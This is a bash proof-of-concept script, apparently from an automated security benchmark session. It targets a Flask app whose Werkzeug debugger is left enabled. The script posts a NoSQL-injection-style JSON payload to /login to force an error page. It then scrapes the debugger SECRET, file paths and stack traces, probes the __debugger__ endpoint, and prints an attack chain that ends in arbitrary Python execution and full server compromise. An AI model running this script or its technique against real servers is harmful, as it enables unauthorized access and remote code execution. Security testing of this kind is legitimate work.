#!/bin/bash
# POC: Demonstrates Flask debug mode enabled with Werkzeug debugger accessible, showing exposed SECRET and potential for remote code execution.
# Target: ./repo
# Created: 2025-12-01T16:14:25.039Z
# Session: benchmark-XBEN-103-24-mincfo1r

# Flask Debug Mode RCE POC
# This script demonstrates the Flask debug mode vulnerability where:
# 1. Malformed JSON triggers a 500 error
# 2. Werkzeug debugger interface is displayed
# 3. Debugger SECRET is exposed in the response
# 4. This allows unauthenticated RCE via the debugger console

TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-8000}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] Flask Debug Mode RCE Vulnerability POC"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Step 1: Send malformed JSON to /login to trigger error and expose debugger
echo "[*] Step 1: Sending malformed JSON to /login endpoint to trigger error..."
RESPONSE=$(curl -s -X POST "${TARGET_URL}/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}')

echo "[*] Analyzing response..."
echo ""

# Check for Werkzeug debugger indicators
if echo "$RESPONSE" | grep -q "werkzeug"; then
    echo "[+] VULNERABLE: Werkzeug debugger interface detected in response"
else
    echo "[-] Werkzeug debugger not found - may not be vulnerable"
fi

# Check for debugger SECRET
if echo "$RESPONSE" | grep -q "SECRET"; then
    SECRET=$(echo "$RESPONSE" | grep -o 'SECRET = "[^"]*"' | head -1)
    echo "[+] CRITICAL: Debugger SECRET exposed in response:"
    echo "    ${SECRET}"
else
    echo "[-] Debugger SECRET not found in response"
fi

# Check for stack traces and file paths
if echo "$RESPONSE" | grep -q "/home/daytona"; then
    echo "[+] VULNERABLE: Full file paths exposed:"
    echo "$RESPONSE" | grep -o '/home/[^"<>]*' | head -3 | sed 's/^/    /'
else
    echo "[-] File paths not clearly exposed"
fi

# Check for BadRequestKeyError indicating error page
if echo "$RESPONSE" | grep -q "BadRequestKeyError\|werkzeug.exceptions"; then
    echo "[+] VULNERABLE: Werkzeug exception details exposed"
fi

# Check for debugger endpoints
if echo "$RESPONSE" | grep -q "__debugger__"; then
    echo "[+] VULNERABLE: Debugger endpoints found in response"
    echo "    Debugger commands accessible via __debugger__ parameter"
fi

# Check for source code display
if echo "$RESPONSE" | grep -q "class\|def \|import"; then
    echo "[+] VULNERABLE: Source code visible in error page"
fi

echo ""
echo "[*] Step 2: Verifying debug mode is accessible..."

# Try to access debugger resource endpoint
DEBUGGER_TEST=$(curl -s "${TARGET_URL}/?__debugger__=yes&cmd=resource&f=style.css" | wc -c)

if [ "$DEBUGGER_TEST" -gt 100 ]; then
    echo "[+] VULNERABLE: Debugger resource endpoint responds with data"
fi

echo ""
echo "[*] Step 3: Summary"
echo ""

# Final verdict
if echo "$RESPONSE" | grep -q "werkzeug" && echo "$RESPONSE" | grep -q "SECRET"; then
    echo "[+] VERDICT: Flask debug mode is ENABLED with Werkzeug debugger EXPOSED"
    echo "[+] RISK: Unauthenticated remote code execution is possible"
    echo ""
    echo "[*] Attack chain:"
    echo "    1. Access debugger via __debugger__=yes parameter"
    echo "    2. Provide the exposed SECRET to authenticate with debugger"
    echo "    3. Execute arbitrary Python code via the interactive console"
    echo "    4. Full server compromise achieved"
    exit 0
else
    echo "[-] Unable to confirm full debug mode vulnerability"
    echo "[-] Some indicators were not found in the response"
    exit 1
fi